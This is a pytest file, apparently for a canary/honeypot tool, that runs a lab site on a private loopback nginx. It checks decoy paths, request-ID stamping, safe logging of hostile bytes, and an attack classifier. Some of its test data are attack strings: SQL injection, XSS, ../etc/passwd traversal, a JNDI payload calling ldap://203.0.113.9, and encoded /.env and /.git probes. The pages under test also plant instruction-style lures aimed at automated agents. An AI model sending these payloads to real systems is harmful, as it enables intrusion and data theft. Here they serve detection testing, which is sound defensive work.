# SPDX-License-Identifier: AGPL-3.0-only
"""The built lab site behind a real nginx, on 127.0.0.1 only.

These tests start a private nginx as the current user on a free loopback port,
serve the generated site with the generated config and the shipped log format,
and check what the design says nginx must do: stamp pages with the request ID,
answer decoy paths (and only those) with their fixed body, and log requests in
a form the reader parses, hostile bytes included.

They run in CI, where nginx is installed. Without nginx they are skipped,
unless LUREWALL_REQUIRE_NGINX=1 says a skip would hide a missing dependency.
"""

from __future__ import annotations

import contextlib
import dataclasses
import http.client
import os
import random
import re
import shutil
import socket
import subprocess
import time
import uuid
from pathlib import Path

import pytest

import nginx_emu
from lurewall import accesslog, canaries, labsite, sigconfig, signals, signing
from lurewall.eventlog import EventLog
from lurewall.logreader import LogReader
from lurewall.verify import verify_log

REPO = Path(__file__).resolve().parents[1]
NGINX = shutil.which("nginx") or next(
    (path for path in ("/usr/sbin/nginx", "/opt/homebrew/bin/nginx") if os.path.exists(path)), None
)
REQUIRED = os.environ.get("LUREWALL_REQUIRE_NGINX") == "1"
ID_RE = re.compile(r"[0-9a-f]{32}")
REF_RE = re.compile(r"(/[a-z0-9._/-]+\?[a-z]+=[0-9a-f]{32})")


class Lab:
    def __init__(self, base: Path, port: int, canary_set, process) -> None:
        self.base = base
        self.port = port
        self.canary_set = canary_set
        self.process = process
        self.access_log = base / "access.log"

    def get(self, path: str, *, ua: str = "lurewall-test", method: str = "GET", headers=None):
        connection = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        try:
            connection.request(method, path, headers={"User-Agent": ua, **(headers or {})})
            response = connection.getresponse()
            body = response.read()
            names = {name.lower(): value for name, value in response.getheaders()}
            return response.status, names, body
        finally:
            connection.close()

    def raw(self, request: bytes) -> bytes:
        """Send bytes exactly as given and return whatever comes back."""
        with socket.create_connection(("127.0.0.1", self.port), timeout=10) as sock:
            sock.sendall(request)
            chunks = []
            with contextlib.suppress(TimeoutError, ConnectionResetError):
                while chunk := sock.recv(65536):
                    chunks.append(chunk)
            return b"".join(chunks)

    def lines(self) -> list[bytes]:
        return self.access_log.read_bytes().splitlines() if self.access_log.exists() else []

    def wait_for_lines(self, count: int) -> list[bytes]:
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            lines = self.lines()
            if len(lines) >= count:
                return lines
            time.sleep(0.05)
        raise AssertionError(f"expected {count} log lines, found {len(self.lines())}")

    def record_for(self, ua: str) -> accesslog.Record:
        """The log record of the request that carried this (unique) user agent."""
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            for raw in self.lines():
                parsed = accesslog.parse_line(
                    raw, 0, now_ms=int(time.time() * 1000), max_age_ms=10**12
                )
                if isinstance(parsed, accesslog.Record) and parsed.ua == ua:
                    return parsed
            time.sleep(0.05)
        raise AssertionError(f"no log record for user agent {ua!r}")


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture(scope="module")
def lab(tmp_path_factory):
    if NGINX is None:
        if REQUIRED:
            pytest.fail("LUREWALL_REQUIRE_NGINX=1 but nginx is not installed")
        pytest.skip("nginx is not installed")
    version = subprocess.run([NGINX, "-V"], capture_output=True, text=True, check=True).stderr  # noqa: S603
    assert "http_sub_module" in version, "this nginx build has no sub_filter module"

    base = tmp_path_factory.mktemp("nginx-lab")
    port = _free_port()
    canary_set = canaries.generate(labsite.site_routes(), rng=random.Random(4242))
    site = labsite.build(canary_set, base / "site", listen=f"127.0.0.1:{port}")

    log_conf = (REPO / "deploy" / "nginx" / "lurewall-log.conf").read_text()
    assert "/var/log/nginx/lurewall.json.log" in log_conf
    log_conf = log_conf.replace("/var/log/nginx/lurewall.json.log", str(base / "access.log"))
    # The rate limit is not under test here, and these tests are quick on purpose.
    log_conf = log_conf.replace("rate=10r/s", "rate=5000r/s").replace("burst=20", "burst=5000")
    conf = base / "nginx.conf"
    conf.write_text(
        "daemon off;\nmaster_process off;\nworker_processes 1;\n"
        f"pid {base}/nginx.pid;\nerror_log {base}/error.log info;\n"
        "events { worker_connections 128; }\n"
        "http {\n"
        "    types { text/html html; text/css css; text/plain txt; text/xml xml;"
        " image/svg+xml svg; }\n"
        "    default_type application/octet-stream;\n"
        f"    client_body_temp_path {base}/body-temp;\n"
        f"    proxy_temp_path {base}/proxy-temp;\n"
        f"    fastcgi_temp_path {base}/fastcgi-temp;\n"
        f"    uwsgi_temp_path {base}/uwsgi-temp;\n"
        f"    scgi_temp_path {base}/scgi-temp;\n"
        f"{log_conf}\n"
        f"    include {site.nginx_conf};\n"
        "}\n"
    )
    command = [NGINX, "-e", str(base / "error.log"), "-p", str(base), "-c", str(conf)]
    output_file = open(base / "nginx.out", "wb")  # noqa: SIM115 - closed in the finally below
    process = subprocess.Popen(command, stdout=output_file, stderr=subprocess.STDOUT)  # noqa: S603
    try:
        deadline = time.monotonic() + 15
        while True:
            if process.poll() is not None:
                output = (base / "nginx.out").read_text(errors="replace")
                errors = (base / "error.log").read_text() if (base / "error.log").exists() else ""
                pytest.fail(f"nginx exited at startup:\n{output}\n{errors}")
            with contextlib.suppress(OSError), socket.create_connection(("127.0.0.1", port), 0.2):
                break
            if time.monotonic() > deadline:
                pytest.fail("nginx did not start listening")
            time.sleep(0.05)
        yield Lab(base, port, canary_set, process)
    finally:
        process.terminate()
        with contextlib.suppress(subprocess.TimeoutExpired):
            process.wait(timeout=10)
        if process.poll() is None:
            process.kill()
            process.wait()
        output_file.close()


def fresh_ua() -> str:
    return f"lurewall-test/{uuid.uuid4().hex}"


def refs_in(lab: Lab, text: str) -> dict[str, str]:
    """{canary id: request ID} for every canary reference found in ``text``."""
    found = {}
    for ref in REF_RE.findall(text):
        hit = lab.canary_set.lookup_uri(ref)
        if hit is not None:
            assert hit.request_id is not None
            found[hit.canary.id] = hit.request_id
    return found


def fetch_page(lab: Lab, path: str):
    """Fetch a page; return (status, headers, text, the request ID nginx logged for it)."""
    ua = fresh_ua()
    status, headers, body = lab.get(path, ua=ua)
    return status, headers, body.decode(), lab.record_for(ua).request_id


# -- page stamping -------------------------------------------------------------------


def test_nginx_stamps_each_page_with_that_requests_id(lab):
    status, headers, text, logged_id = fetch_page(lab, "/")
    assert status == 200
    assert lab.canary_set.placeholder not in text
    found = refs_in(lab, text)
    assert set(found) == {
        "html_comment.instruction",
        "html_comment.bait",
        "hidden_element.instruction",
    }
    # The ID on the page is the ID in the page's own log line: a hit can be tied to it.
    assert set(found.values()) == {logged_id}
    header_value = headers[lab.canary_set.header_name.lower()]
    assert refs_in(lab, header_value) == {"response_header.instruction": logged_id}
    assert headers["cache-control"] == "no-store"

    _status, _headers, again, second_id = fetch_page(lab, "/")
    assert second_id != logged_id and set(refs_in(lab, again).values()) == {second_id}
    # Apart from the ID, two fetches of a page are identical: nothing rotates.
    assert ID_RE.sub("ID", again) == ID_RE.sub("ID", text)


def test_every_placement_is_served_stamped_and_its_decoy_answers(lab):
    carried: dict[str, str] = {}
    for path, expected_status in (
        ("/", 200),
        ("/about.html", 200),
        ("/robots.txt", 200),
        ("/developers/api.html", 200),
        (f"/no-such-page-{uuid.uuid4().hex}", 404),
        ("/staff/", 403),
    ):
        status, headers, text, logged_id = fetch_page(lab, path)
        assert status == expected_status, path
        assert lab.canary_set.placeholder not in text, path
        found = refs_in(lab, text) | refs_in(
            lab, headers.get(lab.canary_set.header_name.lower(), "")
        )
        assert found, path
        assert set(found.values()) == {logged_id}, path
        carried.update(found)
    assert set(carried) == set(canaries.PLACEMENTS)

    for canary in lab.canary_set.canaries:
        ua = fresh_ua()
        status, headers, body = lab.get(canary.reference(carried[canary.id]), ua=ua)
        assert status == 200 and status != 204, canary.id
        assert body == canary.body.encode() and body, canary.id
        assert headers["content-type"].startswith(canary.content_type), canary.id
        assert headers["x-robots-tag"] == "noindex, nofollow", canary.id
        # What the reader will see: the hit, its lure, and the page's request ID.
        hit = lab.canary_set.lookup_uri(lab.record_for(ua).uri)
        assert hit.canary.id == canary.id and hit.canary.lure == canary.lure
        assert hit.request_id == carried[canary.id]


def test_decoy_body_is_fixed_whatever_the_request(lab):
    for canary in lab.canary_set.canaries:
        bodies = set()
        for suffix in ("", "?x=1", f"?{canary.param}={'a' * 32}", f"?{canary.param}=not-an-id"):
            status, _headers, body = lab.get(canary.path + suffix)
            assert status == 200
            bodies.add(body)
        assert bodies == {canary.body.encode()}
        assert lab.canary_set.placeholder.encode() not in body
        status, headers, body = lab.get(canary.path, method="HEAD")
        assert status == 200 and body == b""
        assert int(headers["content-length"]) == len(canary.body.encode())


# -- no oracle: only table paths are decoys ---------------------------------------------


def normal_404(lab: Lab):
    status, headers, body = lab.get(f"/missing-{uuid.uuid4().hex}.html")
    assert status == 404
    return ID_RE.sub("ID", body.decode()), sorted(headers)


def test_a_path_outside_the_table_gets_the_normal_404(lab):
    baseline_body, baseline_headers = normal_404(lab)
    assert "Page not found" in baseline_body
    for canary in lab.canary_set.canaries:
        for near in (
            canary.path + "x",
            canary.path[:-1],
            canary.path + "/",
            canary.path + "/index.html",
            canary.path.rsplit("/", 1)[0],
            canary.path.rsplit("/", 1)[0] + "/",
            canary.path.upper(),
            "/x" + canary.path,
        ):
            status, headers, body = lab.get(near)
            assert status == 404, near
            assert ID_RE.sub("ID", body.decode()) == baseline_body, near
            assert sorted(headers) == baseline_headers, near
            assert "x-robots-tag" not in headers
    for other in (
        "/.env",
        "/admin",
        "/errors/404.html",
        "/decoys/0.body",
        "/nginx/lurewall-site.conf",
    ):
        status, _headers, body = lab.get(other)
        assert status == 404, other
        assert ID_RE.sub("ID", body.decode()) == baseline_body, other


def test_decoy_bodies_and_config_are_not_reachable_any_other_way(lab):
    for path in ("/decoys/", "/../decoys/0.body", "/www/index.html", "/.lurewall-lab-site"):
        status, _headers, _body = lab.get(path)
        assert status in (400, 404), path


# -- not announced, not indexed, not cached ------------------------------------------------


def test_robots_txt_as_served_has_no_disallow(lab):
    status, headers, text, logged_id = fetch_page(lab, "/robots.txt")
    assert status == 200 and headers["content-type"].startswith("text/plain")
    assert "disallow" not in text.lower()
    assert refs_in(lab, text) == {"robots_comment.instruction": logged_id}


def test_api_doc_page_is_served_noindex(lab):
    status, headers, body = lab.get("/developers/api.html")
    assert status == 200 and headers["x-robots-tag"] == "noindex"
    assert b'<meta name="robots" content="noindex">' in body
    assert headers["cache-control"] == "no-store"


def test_assets_are_plain_cacheable_files(lab):
    status, headers, body = lab.get("/assets/site.css")
    assert status == 200 and headers["content-type"].startswith("text/css")
    assert headers["cache-control"] == "public, max-age=3600"
    assert lab.canary_set.header_name.lower() not in headers
    assert f".{lab.canary_set.hidden_class} ".encode() in body
    for canary in lab.canary_set.canaries:
        assert canary.path.encode() not in body


def test_hidden_canaries_are_served_aria_hidden(lab):
    _status, _headers, body = lab.get("/")
    hidden = lab.canary_set.by_id("hidden_element.instruction")
    marker = f'<p class="{lab.canary_set.hidden_class}" aria-hidden="true">'.encode()
    assert marker in body
    assert hidden.path.encode() in body.split(marker, 1)[1].split(b"</p>", 1)[0]


# -- hostile bytes through a real nginx (design test case 16) -------------------------------


HOSTILE_REQUESTS: list[tuple[str, bytes, bytes]] = [
    ("quote_backslash_ua", b"/h1", b'quote " backslash \\ end'),
    ("invalid_utf8_ua", b"/h2", b"\xff\xfe\xfd invalid"),
    ("valid_utf8_ua", b"/h3", "café 日本".encode()),
    ("tab_ua", b"/h4", b"tab\there"),
    ("truncated_multibyte_ua", b"/h5", b"cut \xe2\x82"),
    ("json_breakout_ua", b"/h6", b'","ip":"203.0.113.99","status":"200'),
    ("invalid_utf8_path", b"/h7/\xff\xfe", b"plain"),
    ("percent_invalid_path", b"/h8/%ff%fe", b"plain"),
    ("quote_path", b'/h9/"quoted"\\x', b"plain"),
    ("script_query", b"/h10?q=<script>alert(1)</script>&x='%20OR%201=1", b"plain"),
    ("long_ua", b"/h11", b"A" * 4000),
    ("high_bytes_ua", b"/h12", bytes(range(0x80, 0x100))),
]


def test_hostile_bytes_are_logged_and_every_line_is_accounted_for(lab, tmp_path):
    before = len(lab.lines())
    for _name, path, ua in HOSTILE_REQUESTS:
        request = b"GET " + path + b" HTTP/1.1\r\nHost: lab\r\nUser-Agent: " + ua
        response = lab.raw(request + b"\r\nConnection: close\r\n\r\n")
        assert response.startswith(b"HTTP/1.1 "), _name
    # Requests nginx cannot parse at all are logged too.
    garbage = [
        b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\xff\xfe garbage\r\n\r\n",
        b"GET /ctl\x01\x02path HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n",
        b"GET /h13 HTTP/1.1\r\nHost: lab\r\nUser-Agent: ctl\x01\x02\r\nConnection: close\r\n\r\n",
        b"BREW /h14 HTCPCP/1.0\r\n\r\n",
    ]
    for request in garbage:
        lab.raw(request)
    sent = len(HOSTILE_REQUESTS) + len(garbage)
    raw_lines = lab.wait_for_lines(before + sent)[before:]
    assert len(raw_lines) == sent  # one line per request: nothing split a line, nothing vanished

    # The open question from the design: bytes above 126 reach the log raw.
    log = b"\n".join(raw_lines)
    assert b"\xff\xfe\xfd invalid" in log
    assert bytes(range(0x80, 0x100)) in log
    # And nginx escapes exactly as the test emulator assumes.
    for _name, _path, ua in HOSTILE_REQUESTS:
        assert b'"ua":"' + nginx_emu.escape_json(ua) + b'"' in log, _name

    # Run the whole real log through the reader into a signed log.
    signer = signing.EurekaSigner.ephemeral()
    events = EventLog(tmp_path / "events.log", signer, fsync=False)
    reader = LogReader(lab.access_log, tmp_path / "reader.state", events, max_age_ms=10**12)
    records = []
    while batch := reader.poll():
        records += batch
    reader.close()
    events.close()
    total = len(lab.lines())
    failures = [
        line
        for line in (tmp_path / "events.log").read_bytes().splitlines()
        if b'"parse_failure' in line
    ]
    assert len(records) + len(failures) == total
    assert failures == []  # everything a real nginx wrote is a record
    assert verify_log(tmp_path / "events.log", signer.public_key_hex).ok

    by_uri = {record.uri: record for record in records}
    assert by_uri["/h1"].ua == 'quote " backslash \\ end' and not by_uri["/h1"].invalid_utf8
    assert by_uri["/h2"].ua == "��� invalid" and by_uri["/h2"].invalid_utf8
    assert by_uri["/h3"].ua == "café 日本"
    assert by_uri["/h4"].ua == "tab\there"
    assert by_uri["/h6"].ua == '","ip":"203.0.113.99","status":"200'
    assert all(record.ip == "127.0.0.1" for record in records)  # no text moved a request
    assert by_uri["/h11"].ua == "A" * 4000
    assert any(record.status == 400 for record in records)


# -- signals, against what a real nginx logs ------------------------------------------


def _classifier(lab, *, https: bool = False):
    config = sigconfig.load(REPO / "deploy" / "signals" / "lab-site.toml")
    if https:
        # The same rules on an HTTPS site, where browsers send fetch metadata.
        config = dataclasses.replace(config, https=True, hosts=frozenset({"lab"}))
    return signals.Classifier(config, lab.canary_set, labsite.site_routes())


def _request(
    lab, method: bytes, target: bytes, extra: bytes = b""
) -> tuple[bytes, accesslog.Record]:
    ua = f"lurewall-signal-{uuid.uuid4().hex}"
    response = lab.raw(
        method + b" " + target + b" HTTP/1.1\r\nHost: lab\r\nUser-Agent: " + ua.encode()
        + b"\r\n" + extra + b"Connection: close\r\n\r\n"
    )  # fmt: skip
    return response, lab.record_for(ua)


@pytest.mark.parametrize(
    ("target", "key"),
    [
        (b"/.env", "path:*/.env"),
        (b"/%2eenv", "path:*/.env"),
        (b"/%2Eenv", "path:*/.env"),
        (b"//.env", "path:*/.env"),
        (b"/.ENV", "path:*/.env"),
        (b"/x/../.env", "path:*/.env"),
        (b"/.git/config", "path:*/.git"),
        (b"/%2egit//CONFIG", "path:*/.git"),
        (b"/Admin/", "path:/admin"),
        (b"//a%64min", "path:/admin"),
        (b"/WP-Login.php", "path:/wp-login.php"),
        (b"/%252eenv", "path:*/.env"),
        (b"/%2561dmin/", "path:/admin"),
        (b"/?id=1'%20OR%201=1", "injection:sqli"),
        (b"/?f=..%2f..%2fetc%2fpasswd", "injection:traversal"),
        (b"/?q=%3Cscript%3Ealert(1)%3C/script%3E", "injection:xss"),
        (b"/?x=${jndi:ldap://203.0.113.9/a}", "injection:jndi"),
    ],
)
def test_path_and_injection_variants_as_a_real_nginx_logs_them(lab, target, key):
    response, record = _request(lab, b"GET", target)
    assert response.startswith(b"HTTP/1.1 ")
    # nginx logs the URI as the client sent it, so both forms can be matched.
    assert record.uri == target.decode()
    result = _classifier(lab).classify(record)
    assert key in [signal.key for signal in result.attack]
    assert result.canary is None


@pytest.mark.parametrize("method", [b"PUT", b"DELETE", b"TRACE", b"PROPFIND"])
def test_verb_abuse_as_a_real_nginx_logs_it(lab, method):
    response, record = _request(lab, method, b"/index.html", b"Content-Length: 0\r\n")
    assert response.split(b" ", 2)[1] in (b"405", b"403", b"400")
    assert record.method == method.decode()
    assert [signal.key for signal in _classifier(lab).classify(record).attack] == ["method"]


def test_real_pages_assets_and_decoys_raise_no_attack_signal_on_a_real_nginx(lab):
    classifier = _classifier(lab)
    for target in (b"/", b"/docs/", b"/assets/site.css", b"/robots.txt", b"/no-such-page.html"):
        _response, record = _request(lab, b"GET", target)
        assert classifier.classify(record).attack == (), target
    _response, asset = _request(
        lab, b"GET", b"/assets/site.css", b"Sec-Fetch-Site: same-origin\r\n"
    )
    assert classifier.classify(asset).asset
    result = _classifier(lab, https=True).classify(asset)
    assert result.asset and result.browser_metadata
    for canary in lab.canary_set.canaries:
        response, record = _request(lab, b"GET", canary.reference("0f" * 16).encode())
        assert response.startswith(b"HTTP/1.1 200")
        result = classifier.classify(record)
        assert result.attack == ()
        assert result.counted_canary is not None and result.counted_canary.canary.id == canary.id


def test_a_decoy_reached_through_an_attack_spelling_is_what_nginx_serves(lab):
    # The classifier says this is a decoy request, not a /admin probe. Check
    # that nginx agrees: it resolves the path and answers with the decoy body.
    canary = lab.canary_set.canaries[0]
    response, record = _request(lab, b"GET", b"/admin/.." + canary.path.encode())
    assert response.startswith(b"HTTP/1.1 200")
    assert response.endswith(canary.body.encode())
    result = _classifier(lab).classify(record)
    assert result.canary is not None
    assert [signal.key for signal in result.attack] == ["injection:traversal"]


def test_cross_site_headers_as_a_real_nginx_logs_them(lab):
    classifier = _classifier(lab, https=True)
    for extra, reason in (
        (b"Sec-Fetch-Site: cross-site\r\n", "sec_fetch_site"),
        (b"Referer: https://evil.example/frame.html\r\n", "referer"),
    ):
        _response, record = _request(lab, b"GET", b"/.env", extra)
        result = classifier.classify(record)
        assert result.cross_site == reason
        assert result.attack == ()
